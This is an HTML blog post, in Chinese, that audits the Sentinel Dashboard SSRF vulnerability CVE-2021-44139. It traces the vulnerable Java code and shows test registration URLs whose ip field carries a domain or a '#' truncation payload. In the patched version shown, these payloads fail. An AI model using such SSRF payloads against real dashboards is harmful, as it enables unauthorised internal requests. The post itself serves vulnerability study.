@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            Sentinel Dashboard SSRF（CVE-2021-44139）代码审计
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="TPA HACK-NOTE" type="application/atom+xml">
+</head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">Sentinel Dashboard SSRF（CVE-2021-44139）代码审计</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-07-16
+                        </span>
+                        
+                            
+                                <span id="/posts/2490687057.html" class="leancloud_visitors" data-flag-title="Sentinel Dashboard SSRF（CVE-2021-44139）代码审计">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                              
+                        
+                    </p>
+                    
+                        
+                            <span class="category-color">web</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">网络安全</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="Sentinel-Dashboard-SSRF（CVE-2021-44139）代码审计"><a href="#Sentinel-Dashboard-SSRF（CVE-2021-44139）代码审计" class="headerlink" title="Sentinel Dashboard SSRF（CVE-2021-44139）代码审计"></a>Sentinel Dashboard SSRF（CVE-2021-44139）代码审计</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a target="_blank" rel="noopener" href="https://github.com/alibaba/Sentinel/releases">https://github.com/alibaba/Sentinel/releases</a> </p>
+<p>版本：1.8.3</p>
+<p>Java：1.8</p>
+<p>启动DashboardApplication.java</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716100735230.png" alt="image-20240716100735230"></p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716100920402.png" alt="image-20240716100920402"></p>
+<p>访问本地IP+端口<a target="_blank" rel="noopener" href="http://172.16.80.28:8080/#/login">http://172.16.80.28:8080/#/login</a></p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716100909953.png" alt="image-20240716100909953"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据issue：<a target="_blank" rel="noopener" href="https://github.com/alibaba/Sentinel/issues/2451">https://github.com/alibaba/Sentinel/issues/2451</a></p>
+<p>漏洞点在com.alibaba.csp.sentinel.dashboard.metric.MetricFetcher#fetchOnce</p>
+<p>根据issue的这段话大致了解了由于缺少对ip字段的校验，可以通过符号#截断URL内容</p>
+<blockquote>
+<p>通过查看代码可以发现，该方法中会遍历注册AppInfo中每台机器MachineInfo的注册信息，构造对应的URL进行采集客户端限流熔断等数据，但其ip字段无任何校验，通过井号’#’等字符就可以截断后续的URL内容（RFC），进而控制管控平台sentinel-dashboard发起任意GET请求。</p>
+</blockquote>
+<p>接下来进行代码分析，找到对应代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * fetch metric between [startTime, endTime], both side inclusive</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fetchOnce</span><span class="params">(String app, <span class="type">long</span> startTime, <span class="type">long</span> endTime, <span class="type">int</span> maxWaitSeconds)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (maxWaitSeconds &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;maxWaitSeconds must &gt; 0, but &quot;</span> + maxWaitSeconds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">AppInfo</span> <span class="variable">appInfo</span> <span class="operator">=</span> appManagement.getDetailApp(app);</span><br><span class="line">    <span class="comment">// auto remove for app</span></span><br><span class="line">    <span class="keyword">if</span> (appInfo.isDead()) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;Dead app removed: &#123;&#125;&quot;</span>, app);</span><br><span class="line">        appManagement.removeApp(app);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Set&lt;MachineInfo&gt; machines = appInfo.getMachines();</span><br><span class="line">    logger.debug(<span class="string">&quot;enter fetchOnce(&quot;</span> + app + <span class="string">&quot;), machines.size()=&quot;</span> + machines.size()</span><br><span class="line">        + <span class="string">&quot;, time intervalMs [&quot;</span> + startTime + <span class="string">&quot;, &quot;</span> + endTime + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (machines.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;fetch&quot;</span>;</span><br><span class="line">    <span class="type">AtomicLong</span> <span class="variable">unhealthy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">AtomicLong</span> <span class="variable">success</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">AtomicLong</span> <span class="variable">fail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">    <span class="comment">/** app_resource_timeSecond -&gt; metric */</span></span><br><span class="line">    <span class="keyword">final</span> Map&lt;String, MetricEntity&gt; metricMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">CountDownLatch</span> <span class="variable">latch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(machines.size());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">final</span> MachineInfo machine : machines) &#123;</span><br><span class="line">        <span class="comment">// auto remove</span></span><br><span class="line">        <span class="keyword">if</span> (machine.isDead()) &#123;</span><br><span class="line">            latch.countDown();</span><br><span class="line">            appManagement.getDetailApp(app).removeMachine(machine.getIp(), machine.getPort());</span><br><span class="line">            logger.info(<span class="string">&quot;Dead machine removed: &#123;&#125;:&#123;&#125; of &#123;&#125;&quot;</span>, machine.getIp(), machine.getPort(), app);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!machine.isHealthy()) &#123;</span><br><span class="line">            latch.countDown();</span><br><span class="line">            unhealthy.incrementAndGet();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://&quot;</span> + machine.getIp() + <span class="string">&quot;:&quot;</span> + machine.getPort() + <span class="string">&quot;/&quot;</span> + METRIC_URL_PATH</span><br><span class="line">            + <span class="string">&quot;?startTime=&quot;</span> + startTime + <span class="string">&quot;&amp;endTime=&quot;</span> + endTime + <span class="string">&quot;&amp;refetch=&quot;</span> + <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        httpGet.setHeader(HTTP.CONN_DIRECTIVE, HTTP.CONN_CLOSE);</span><br><span class="line">        httpclient.execute(httpGet, <span class="keyword">new</span> <span class="title class_">FutureCallback</span>&lt;HttpResponse&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(<span class="keyword">final</span> HttpResponse response)</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    handleResponse(response, machine, metricMap);</span><br><span class="line">                    success.incrementAndGet();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    logger.error(msg + <span class="string">&quot; metric &quot;</span> + url + <span class="string">&quot; error:&quot;</span>, e);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    latch.countDown();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(<span class="keyword">final</span> Exception ex)</span> &#123;</span><br><span class="line">                latch.countDown();</span><br><span class="line">                fail.incrementAndGet();</span><br><span class="line">                httpGet.abort();</span><br><span class="line">                <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> SocketTimeoutException) &#123;</span><br><span class="line">                    logger.error(<span class="string">&quot;Failed to fetch metric from &lt;&#123;&#125;&gt;: socket timeout&quot;</span>, url);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> ConnectException) &#123;</span><br><span class="line">                    logger.error(<span class="string">&quot;Failed to fetch metric from &lt;&#123;&#125;&gt; (ConnectionException: &#123;&#125;)&quot;</span>, url, ex.getMessage());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    logger.error(msg + <span class="string">&quot; metric &quot;</span> + url + <span class="string">&quot; error&quot;</span>, ex);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cancelled</span><span class="params">()</span> &#123;</span><br><span class="line">                latch.countDown();</span><br><span class="line">                fail.incrementAndGet();</span><br><span class="line">                httpGet.abort();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        latch.await(maxWaitSeconds, TimeUnit.SECONDS);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.info(msg + <span class="string">&quot; metric, wait http client error:&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//long cost = System.currentTimeMillis() - start;</span></span><br><span class="line">    <span class="comment">//logger.info(&quot;finished &quot; + msg + &quot; metric for &quot; + app + &quot;, time intervalMs [&quot; + startTime + &quot;, &quot; + endTime</span></span><br><span class="line">    <span class="comment">//    + &quot;], total machines=&quot; + machines.size() + &quot;, dead=&quot; + dead + &quot;, fetch success=&quot;</span></span><br><span class="line">    <span class="comment">//    + success + &quot;, fetch fail=&quot; + fail + &quot;, time cost=&quot; + cost + &quot; ms&quot;);</span></span><br><span class="line">    writeMetric(metricMap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过观察代码一眼就能发现可能存在SSRF漏洞的代码段</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716102106095.png" alt="image-20240716102106095"></p>
+<p>这个请求的url中的ip和port都和machine对象有关</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://&quot;</span> + machine.getIp() + <span class="string">&quot;:&quot;</span> + machine.getPort() + <span class="string">&quot;/&quot;</span> + METRIC_URL_PATH</span><br><span class="line">                + <span class="string">&quot;?startTime=&quot;</span> + startTime + <span class="string">&quot;&amp;endTime=&quot;</span> + endTime + <span class="string">&quot;&amp;refetch=&quot;</span> + <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其中MachineInfo machine在machines循环里</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716102408847.png" alt="image-20240716102408847"></p>
+<p>再继续看machines怎么来的，machines是一个Set集合，从appInfo#getMachines获取</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716102453189.png" alt="image-20240716102453189"></p>
+<p>继续追appInfo的代码，是appManagement#getDetailApp方法中获得的</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716102653795.png" alt="image-20240716102653795"></p>
+<p>查看getDetailApp方法</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716102843033.png" alt="image-20240716102843033"></p>
+<p>继续查看，追踪到这个MachineDiscovery接口发现这个是可以添加addMachine还可以removeMachine这些操作的<img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716103533272.png" alt="image-20240716103533272"></p>
+<p>回到最初的代码中，发现app参数是fetchOnce直接传参到getDetailApp中的</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716104130481.png" alt="image-20240716104130481"></p>
+<p>看哪些调用了fetchOnce方法，同类中的doFetchAppMetric方法</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716104350497.png" alt="image-20240716104350497"></p>
+<p>调用doFetchAppMetric的方法fetchAllApp</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716104442017.png" alt="image-20240716104442017"></p>
+<p>fetchAllApp被start方法调用，通过代码发现这个start里面是个定时器10s执行一次</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716104528677.png" alt="image-20240716104528677"></p>
+<p>start又被MetricFetcher无参构造方法直接调用</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716104719534.png" alt="image-20240716104719534"></p>
+<p>而该类被@Component注解标记，会在Spring容器启动时自动创建MetricFetcher类的实例调用无参构造方法，作为Bean进行管理。</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716105138648.png" alt="image-20240716105138648"></p>
+<p>在同目录下创建一个对象进行测试，启动Spring容器</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716105346420.png" alt="image-20240716105346420"></p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716105412688.png" alt="image-20240716105412688"></p>
+<p>最终的调用链：</p>
+<p>无参构造方法 &#x3D;&gt; start &#x3D;&gt; fetchAllApp &#x3D;&gt; doFetchAppMetric &#x3D;&gt; fetchOnce</p>
+<p>也就是说在容器启动时就会执行这个10s一次的定时任务</p>
+<p>如何触发定时任务：</p>
+<p>想办法注册Machine，在之前找到了addMachine的接口</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716105934968.png" alt="image-20240716105934968"></p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716105952954.png" alt="image-20240716105952954"></p>
+<p>查看被调用情况</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716110009970.png" alt="image-20240716110009970"></p>
+<p>直接被Controller层调用，而且ip是String类型，port是Integer类型直接传参调用，</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716110107975.png" alt="image-20240716110107975"></p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716110137918.png" alt="image-20240716110137918"></p>
+<p>在过程中一处对ip进行的判断为是否为空，长度是否大于128，此条件基本可以忽略</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716110333539.png" alt="image-20240716110333539"></p>
+<p>另一处判断主要看ipv4，我们需要绕过的就是这个判断</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716111004518.png" alt="image-20240716111004518"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] textToNumericFormatV4(String var0) &#123;</span><br><span class="line">       <span class="type">byte</span>[] var1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>];</span><br><span class="line">       <span class="type">long</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> var0.length();</span><br><span class="line">       <span class="keyword">if</span> (var6 != <span class="number">0</span> &amp;&amp; var6 &lt;= <span class="number">15</span>) &#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">               <span class="type">char</span> <span class="variable">var8</span> <span class="operator">=</span> var0.charAt(var7);</span><br><span class="line">               <span class="keyword">if</span> (var8 == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (var5 || var2 &lt; <span class="number">0L</span> || var2 &gt; <span class="number">255L</span> || var4 == <span class="number">3</span>) &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   var1[var4++] = (<span class="type">byte</span>)((<span class="type">int</span>)(var2 &amp; <span class="number">255L</span>));</span><br><span class="line">                   var2 = <span class="number">0L</span>;</span><br><span class="line">                   var5 = <span class="literal">true</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="type">int</span> <span class="variable">var9</span> <span class="operator">=</span> Character.digit(var8, <span class="number">10</span>);</span><br><span class="line">                   <span class="keyword">if</span> (var9 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   var2 *= <span class="number">10L</span>;</span><br><span class="line">                   var2 += (<span class="type">long</span>)var9;</span><br><span class="line">                   var5 = <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (!var5 &amp;&amp; var2 &gt;= <span class="number">0L</span> &amp;&amp; var2 &lt; <span class="number">1L</span> &lt;&lt; (<span class="number">4</span> - var4) * <span class="number">8</span>) &#123;</span><br><span class="line">               <span class="keyword">switch</span> (var4) &#123;</span><br><span class="line">                   <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                       var1[<span class="number">0</span>] = (<span class="type">byte</span>)((<span class="type">int</span>)(var2 &gt;&gt; <span class="number">24</span> &amp; <span class="number">255L</span>));</span><br><span class="line">                   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                       var1[<span class="number">1</span>] = (<span class="type">byte</span>)((<span class="type">int</span>)(var2 &gt;&gt; <span class="number">16</span> &amp; <span class="number">255L</span>));</span><br><span class="line">                   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                       var1[<span class="number">2</span>] = (<span class="type">byte</span>)((<span class="type">int</span>)(var2 &gt;&gt; <span class="number">8</span> &amp; <span class="number">255L</span>));</span><br><span class="line">                   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                       var1[<span class="number">3</span>] = (<span class="type">byte</span>)((<span class="type">int</span>)(var2 &gt;&gt; <span class="number">0</span> &amp; <span class="number">255L</span>));</span><br><span class="line">                   <span class="keyword">default</span>:</span><br><span class="line">                       <span class="keyword">return</span> var1;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行DEBUG分析，先尝试域名</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716111544373.png" alt="image-20240716111544373"></p>
+<p>这个域名太长了&gt;15，直接跳出if判断了</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716111705079.png" alt="image-20240716111705079"></p>
+<p>dnslog和ceye都不行只能本地改host进行测试了</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716112144788.png" alt="image-20240716112144788"></p>
+<p>打入payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.80.28:8080/registry/machine?app=1&amp;appType=1&amp;version=1&amp;v=1&amp;hostname=1&amp;ip=www.hisi.com&amp;port=80</span><br></pre></td></tr></table></figure>
+
+<p>可以看到结果并不行，主要逻辑是通过字符串索引遍历我们的输入<a target="_blank" rel="noopener" href="http://www.hisi.com的字符串,并且会将字符转为数字当/">www.hisi.com的字符串，并且会将字符转为数字当</a>&lt;0时会直接return null</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716112756492.png" alt="image-20240716112756492"></p>
+<p>那测试下127.0.0.1#，这种也无法传参进去，因为判断到#结果也不是证书直接return null</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.80.28:8080/registry/machine?app=1&amp;appType=1&amp;version=1&amp;v=1&amp;hostname=1&amp;ip=127.0.0.1#&amp;port=80</span><br></pre></td></tr></table></figure>
+
+<p>原来发现是版本问题 1.8.3做了这一条的修复，就保证ip的输入禁止输入除了小数点的字符了</p>
